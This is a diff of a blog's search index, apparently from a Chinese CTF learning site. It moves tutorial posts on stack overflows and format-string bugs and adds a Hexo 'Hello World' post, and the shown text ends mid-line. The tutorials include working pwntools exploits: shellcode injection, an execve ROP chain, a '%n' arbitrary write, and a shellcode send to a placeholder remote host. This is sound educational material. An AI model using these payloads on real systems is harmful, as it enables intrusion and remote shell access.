@@ -1,234 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>栈溢出基础</title>
-    <url>/posts/c68c5dc4/</url>
-    <content><![CDATA[<h1 id="栈溢出基础总结"><a href="#栈溢出基础总结" class="headerlink" title="栈溢出基础总结"></a>栈溢出基础总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h3><p>需要注意的是</p>
-<p>函数调用过程中，调用函数的参数在其自身栈帧，即被调用函数的形参。被调用函数栈帧存放自身的局部变量，需要使用参数时，根据偏移向调用函数的栈帧中寻找。</p>
-<a id="more"></a>
-
-<p>动态调试一个简单的程序说明问题。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    c = a+b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    x = fun(a,b);</span><br><span class="line">    <span class="built_in">printf</span>(x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>为了方便演示，使用gcc编译为32位。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 test.c -g -o test #-g 生成调试信息，-ggdb为生成专属gdb的调试信息。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以看到，main函数的变量存在main的栈帧中。</p>
-<p><img src="/posts/c68c5dc4/image-20201030201951676.png" alt="image-20201030201951676"></p>
-<p>在调用的fun函数中，使用a，b时向main的栈帧访问。</p>
-<p><img src="/posts/c68c5dc4/image-20201030202426288.png" alt="image-20201030202426288"></p>
-<h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX即No-eXecute（不可执行）的意思，NX enable意味着栈不可执行。</p>
-<h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>开启canary后的栈结构，其中canary不一定在rbp-8的位置</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
-
-<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中rbp-0x8（通过这个汇编代码可以判断canary插入入位置） 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
-
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用栈溢出漏洞劫持执行流，让程序执行写入的shellcode。</p>
-<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+将shellcode放入可执行的段中</p>
-<h3 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h3><h4 id="pwntools的shellcode生成"><a href="#pwntools的shellcode生成" class="headerlink" title="pwntools的shellcode生成"></a>pwntools的shellcode生成</h4><p>利用pwntools的shellcraft模块可方便的生成shellcode</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>)</span><br><span class="line"><span class="comment"># EXPLOIT CODE GOES HERE</span></span><br><span class="line">r.send(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#shellcraft.sh()是执行/bin/sh的shellcode。不使用设置的环境可改为shellcraft.amd64.linux.sh()</span></span><br><span class="line"><span class="comment">#asm()函数接收一个字符串作为参数，得到汇编码的机器代码。</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>根据攻击的目标机通过context设置环境变量</p>
-<ul>
-<li><strong><em>arch</em></strong>设置架构类型</li>
-<li><strong><em>os</em></strong>设置操作系统</li>
-<li><strong><em>log_level</em></strong>设置日志级别，常设为debug</li>
-</ul>
-<h4 id="exploit-db"><a href="#exploit-db" class="headerlink" title="exploit-db"></a><a href="https://www.exploit-db.com/">exploit-db</a></h4><p>pwntools可以生成一些简单、常规的shellcode。对于特殊要求的可以在exploit-db中查找。</p>
-<h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><p>ida反编译结果</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>gets函数明显的存在栈溢出。strncpy函数将输入复制给buf2.用ida可以看到buf2在bss段，大小为0x64.</p>
-<p><img src="/posts/c68c5dc4/image-20201031111332809.png" alt="image-20201031111332809"></p>
-<p>在gdb调试中使用vmmap，查看各段</p>
-<p><img src="/posts/c68c5dc4/image-20201031111751831.png" alt="image-20201031111751831"></p>
-<p>bss段有可执行权限。</p>
-<p>exp为</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>注意一点，这里ida显示的v4与ebp的偏移是0x64，实际上不准确。</p>
-<p>在调试中，可以看到，v4相对esp的偏移是0x1c,esp为0xffffce00，所以v4为0xffffce1c。与ebp的偏移是0x6c。所以溢出到ret的数据一共是0x6c+4（112）。</p>
-<p><img src="/posts/c68c5dc4/image-20201031113605999.png" alt="image-20201031113605999"></p>
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>直接使用系统调用来获得shell。即通过一系列的gadgets，将各个寄存器置为系统调用需要的参数，然后执行int 0x80即可。</p>
-<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+足够的gadgets。在没法写入可执行的shellcode的时候考虑。</p>
-<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p>
-<ol>
-<li>应用程序调用库函数（API）；</li>
-<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
-<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
-<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
-<li>中断处理函数返回到 API 中；</li>
-<li>API 将 EAX 返回给应用程序。</li>
-</ol>
-<p>应用程序调用系统调用的过程是：</p>
-<ol>
-<li>把系统调用的编号存入 EAX；</li>
-<li>把函数参数存入其它通用寄存器；</li>
-<li>触发 0x80 号中断（int 0x80）。</li>
-</ol>
-<p>最常见的系统调用</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
-
-<p>寄存器的状态为</p>
-<ul>
-<li>eax为系统调用号，0xb</li>
-<li>ebx为第一个参数，即指向字符串”/bin/sh”的地址</li>
-<li>ecx、edx应为0</li>
-</ul>
-<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>使用ROPgadget来寻找所需要的gadgets。</p>
-<p>关于ROPgadget的使用</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                 [--<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;] [--memstr &lt;<span class="built_in">string</span>&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                 [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                 [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                 [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                 [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                 [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                 [--dump] [--silent]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show <span class="keyword">this</span> help message <span class="keyword">and</span> <span class="built_in">exit</span></span><br><span class="line">  -v, --version         Display the ROPgadget<span class="number">&#x27;</span>s version</span><br><span class="line">  -c, --checkUpdate     Checks <span class="keyword">if</span> a <span class="keyword">new</span> version is available</span><br><span class="line">  --binary &lt;binary&gt;     Specify a binary filename to analyze</span><br><span class="line">  --opcode &lt;opcodes&gt;    Search opcode in executable segment</span><br><span class="line">  --<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;     Search <span class="built_in">string</span> in readable segment</span><br><span class="line">  --memstr &lt;<span class="built_in">string</span>&gt;     Search each byte in all readable segment</span><br><span class="line">  --depth &lt;nbyte&gt;       Depth <span class="keyword">for</span> search engine (<span class="keyword">default</span> <span class="number">10</span>)</span><br><span class="line">  --only &lt;key&gt;          Only show specific instructions</span><br><span class="line">  --filter &lt;key&gt;        Suppress specific mnemonics</span><br><span class="line">  --range &lt;start-end&gt;   Search between two addresses (<span class="number">0</span>x...<span class="number">-0</span>x...)</span><br><span class="line">  --badbytes &lt;byte&gt;     Rejects specific bytes in the gadget<span class="number">&#x27;</span>s address</span><br><span class="line">  --rawArch &lt;arch&gt;      Specify an arch <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawMode &lt;mode&gt;      Specify a mode <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawEndian &lt;endian&gt;  Specify an endianness <span class="keyword">for</span> a raw file</span><br><span class="line">  --re &lt;re&gt;             Regular expression</span><br><span class="line">  --offset &lt;hexaddr&gt;    Specify an offset <span class="keyword">for</span> gadget addresses</span><br><span class="line">  --ropchain            Enable the ROP chain generation</span><br><span class="line">  --thumb               Use the thumb mode <span class="keyword">for</span> the search engine (ARM only)</span><br><span class="line">  --console             Use an interactive console <span class="keyword">for</span> search engine</span><br><span class="line">  --norop               Disable ROP search engine</span><br><span class="line">  --nojop               Disable JOP search engine</span><br><span class="line">  --callPreceded        Only show gadgets which are call-preceded</span><br><span class="line">  --nosys               Disable SYS search engine</span><br><span class="line">  --multibr             Enable multiple branch gadgets</span><br><span class="line">  --all                 Disables the removal of duplicate gadgets</span><br><span class="line">  --noinstr             Disable the gadget instructions console printing</span><br><span class="line">  --dump                Outputs the gadget bytes</span><br><span class="line">  --silent              Disables printing of gadgets during analysis</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="简单的例子-1"><a href="#简单的例子-1" class="headerlink" title="简单的例子"></a>简单的例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/posts/c68c5dc4/image-20201104162146702.png" alt="image-20201104162146702"></p>
-<p><img src="/posts/c68c5dc4/image-20201104162430363.png" alt="image-20201104162430363"></p>
-<p><img src="/posts/c68c5dc4/image-20201104162507306.png" alt="image-20201104162507306"></p>
-<p><img src="/posts/c68c5dc4/image-20201104162857614.png" alt="image-20201104162857614"></p>
-<p>思路就是通过一系列gadgets，改变寄存器的参数然后再将rip指向int 0x80执行系统调用。</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里的ida显示的偏移不准确，需要用gdb调试<img src="/posts/c68c5dc4/image-20201104163900844.png" alt="image-20201104163900844"></p>
-<p>同时,注意参数的入栈顺序。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh</span><br></pre></td></tr></table></figure>
-
-<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="PLT与GOT"><a href="#PLT与GOT" class="headerlink" title="PLT与GOT"></a>PLT与GOT</h4><p>PLT表(Procedure Linkage Table)过程连接表,在程序中以 .plt 节表示，该表处于代码段，每一个表项表示了一个与要重定位的函数相关的若干条指令，每个表项长度为 16 个字节，存储的是用于做延迟绑定的代码。调用一个外部函数的时候，会先去PLT中找，如果是非首次调用，就会直接跳转到相应的GOT表的表项，执行动态链接库里对应的函数。如果是首次，真正的函数地址会先被解析并填入相应的 GOT 表项，然后调用。</p>
-<p>GOT表(Global Offset Table)全局偏移表，在程序中以 .got.plt 表示，该表处于数据段，每一个表项存储的都是一个地址，每个表项长度是当前程序的对应需要寻址长度（32位程序：4字节，64位程序：8字节）。</p>
-<h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>为了方便实验,将所有的保护都关掉.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 plt\&amp;got.c -g -z execstack -fno-stack-protector -no-pie -z norelro -o plt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/c68c5dc4/image-20201104173407071.png" alt="image-20201104173407071"></p>
-<p>首次调用puts函数时,首先跳转到puts函数在got.plt中记录位置</p>
-<p><img src="/posts/c68c5dc4/image-20201105113447389.png" alt="image-20201105113447389"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">jmp   dword ptr [_GLOBAL_OFFSET_TABLE_+12]即跳转到内存0x8049724中低32位即0x80482c6.</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/c68c5dc4/image-20201105113807853.png" alt="image-20201105113807853"></p>
-<p><img src="/posts/c68c5dc4/image-20201105114209230.png" alt="image-20201105114209230"></p>
-<p>之后,跳转到.plt段首PLT0.解析puts的实际地址.</p>
-<p><img src="/posts/c68c5dc4/image-20201105114436758.png" alt="image-20201105114436758"></p>
-<p>解析完成后,将真实地址填入到got表项中并执行.</p>
-<p><img src="/posts/c68c5dc4/image-20201105114919183.png" alt="image-20201105114919183"></p>
-<p>第二次调用</p>
-<p><img src="/posts/c68c5dc4/image-20201105115211598.png" alt="image-20201105115211598"></p>
-<p>直接自 .got.plt 跳转到 puts 的真实地址,没有了第一次的解析地址过程.</p>
-<ul>
-<li><p>GOT 表位于.got 和.got.plt Ssection</p>
-<ul>
-<li>.got Section 存放外部全局变量的 GOT 表，非延迟绑定</li>
-<li>.got.plt Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定.    </li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">.got.plt(解析前)</th>
-<th align="center">.got.plt(解析后)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">.dynamic section 地址</td>
-<td align="center">.dynamic section 地址</td>
-</tr>
-<tr>
-<td align="center">link_map 地址</td>
-<td align="center">link_map 地址</td>
-</tr>
-<tr>
-<td align="center">_dl_runtime_resolve</td>
-<td align="center">_dl_runtime_resolve</td>
-</tr>
-<tr>
-<td align="center">puts@plt + 6</td>
-<td align="center">puts</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>.got.plt 前三项有特殊含义，从第四项开始保存引用的各个外部函数的 GOT 表项：</p>
-<ul>
-<li>第一项保存的是.dynamic section 的地址 (为动态链接提供信息，例如符号表、字符串表等)</li>
-<li>第二项保存的是 link_map 结构地址 (链表，包含所有加载的共享库信息)</li>
-<li>第三项保存了_dl_runtime_resolve 函数的地址 (用于解析外部函数符号的函数，解析完成后会直接执行该函数)</li>
-</ul>
-</li>
-</ul>
-<h4 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>基本的原理就是通过plt调用各种函数.在没有shellcode可写,程序中没有后门函数时可以通过已有的plt去调用动态连接库里的其他函数,如system(“/bin/sh”);可以修改got表项内容,如puts,下次调用puts的时候就会执行修改后的函数.</p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>stack</tag>
-        <tag>ctf</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
+    <title>Hello World</title>
     <url>/posts/0/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>格式化字符串</title>
-    <url>/posts/7fabda03/</url>
-    <content><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在printf函数中，format字符串中有的参数，如果没有给出会自动访问在format之后的内存作为参数。</p>
-<h3 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%s\n&quot;</span>,s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new format:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>进入调试，首先可以看到正常的printf函数调用：</p>
-<a id="more"></a>
-
-<p><img src="/posts/7fabda03/image-20201113225150355.png" alt="image-20201113225150355"></p>
-<p>可以看到，对于format，实际上在是存在栈上其偏移6的父函数栈帧上的即格式化字符串的偏移为6。与正常的函数调用时的参数关系一致。</p>
-<p><img src="/posts/7fabda03/IMG_0044.PNG" alt="IMG_0044"></p>
-<p>如果是缺少相应的参数，printf函数会从偏移1开始匹配参数。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/7fabda03/image-20201113230619688.png" alt="image-20201113230619688"></p>
-<p><img src="/posts/7fabda03/image-20201113230645900.png" alt="image-20201113230645900"></p>
-<p><strong>这样的方法可以用来寻找格式化字符串的偏移量</strong></p>
-<p><strong>上述实验是32位，和64位中区别在于，64位优先将参数传入6个寄存器中。</strong></p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>灵活使用格式化字符串的格式字符，可以做到任意地址的读写。</p>
-<p>常用到的有：</p>
-<ul>
-<li>%x 将参数作为无符号以十六进制表示的整数打印</li>
-<li>%p 打印地址</li>
-<li>%s 将参数作为字符串地址，打印相应字符串（如果参数指向的不是一个字符串会造成程序崩溃）</li>
-<li>%n 将参数作为地址，修改相应地址的内容。用于任意地址的写。</li>
-</ul>
-<p><strong>pwntools中有fmtstr_payload可以方便的构造任意地址写的payload</strong></p>
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在对任意地址写的时候，如果地址较低，\x00会造成格式化字符串的截断，无法达到预期效果。</p>
-<h4 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h4><p><img src="/posts/7fabda03/image-20201113232149244.png" alt="image-20201113232149244"></p>
-<p><img src="/posts/7fabda03/image-20201113232249593.png" alt="image-20201113232249593"></p>
-<p><img src="/posts/7fabda03/image-20201113232302791.png" alt="image-20201113232302791"></p>
-<p>显然存在格式化字符串漏洞，只需要将bss段的变量改为非0，执行后门函数即可。</p>
-<p>通过上述方法可以得到偏移为10.</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./pwn(2)&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">addr = <span class="number">0x60107c</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+<span class="string">b&quot;%11$n&quot;</span>+p64(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里将要修改的地址置后，是p64(addr)的\x00会造成截断，如果payload为<code> p64(addr)+b&#39;%10$n&#39;</code></p>
-<p>格式化字符串不会读到‘%10$n’</p>
-<p>因此将地址之后，填满64位的内存，将地址的偏移构造为11.将0x60107c的内容改为3，执行sh函数。</p>
+    <content><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><h2 id="1-新建文章"><a href="#1-新建文章" class="headerlink" title="1 新建文章"></a>1 新建文章</h2><p>以hello world为例，在hexo目录下命令行输入<code>hexo new &quot;hello_world&quot;</code>，然后会在source的_posts目录下生成一个hello_world.md文件,在该markdown文件中就可以编辑这篇文章的内容了。编辑完成后刷新博客，博客里便会出现这篇文章，同时hexo也会直接为这篇文章生成一个页面。</p>
+<h2 id="2-新建草稿"><a href="#2-新建草稿" class="headerlink" title="2 新建草稿"></a>2 新建草稿</h2><p>hexo默认配置是新建文章，所以如果需要新建一篇草稿，需要输入<code>hexo new draft &quot;文章名称&quot;</code>，然后再source的目录下会生成一个_drafts文件夹，里面会有所有新建的草稿，如果想要预览草稿，可以输入<code>hexo server --draft</code>命令来预览草稿文件</p>
+<p>当草稿完成以后，可以通过输入<code>hexo publish &quot;文章名称&quot;</code>来发布草稿，然后这篇草稿会从_drafts中被删除，出现在_posts目录下。</p>
+<h2 id="3-删除文章"><a href="#3-删除文章" class="headerlink" title="3 删除文章"></a>3 删除文章</h2><p>删除文章十分简单，只需要把_posts目录下需要删除的markdown删除，然后刷新博客之后这篇文章就不会出现在博客中了。</p>
+<p>当然还有更多的教程可以直接去<a href="https://hexo.io/zh-cn/docs/writing.html">官网</a>学习。</p>
 ]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>pwn</tag>
-        <tag>fmtstr</tag>
-      </tags>
   </entry>
   <entry>
     <title>堆基础</title>
@@ -410,14 +190,269 @@
         <category>pwn</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
-        <tag>pwn</tag>
         <tag>heap</tag>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈溢出基础</title>
+    <url>/posts/c68c5dc4/</url>
+    <content><![CDATA[<h1 id="栈溢出基础总结"><a href="#栈溢出基础总结" class="headerlink" title="栈溢出基础总结"></a>栈溢出基础总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h3><p>需要注意的是</p>
+<p>函数调用过程中，调用函数的参数在其自身栈帧，即被调用函数的形参。被调用函数栈帧存放自身的局部变量，需要使用参数时，根据偏移向调用函数的栈帧中寻找。</p>
+<a id="more"></a>
+
+<p>动态调试一个简单的程序说明问题。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    c = a+b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>;</span><br><span class="line">    <span 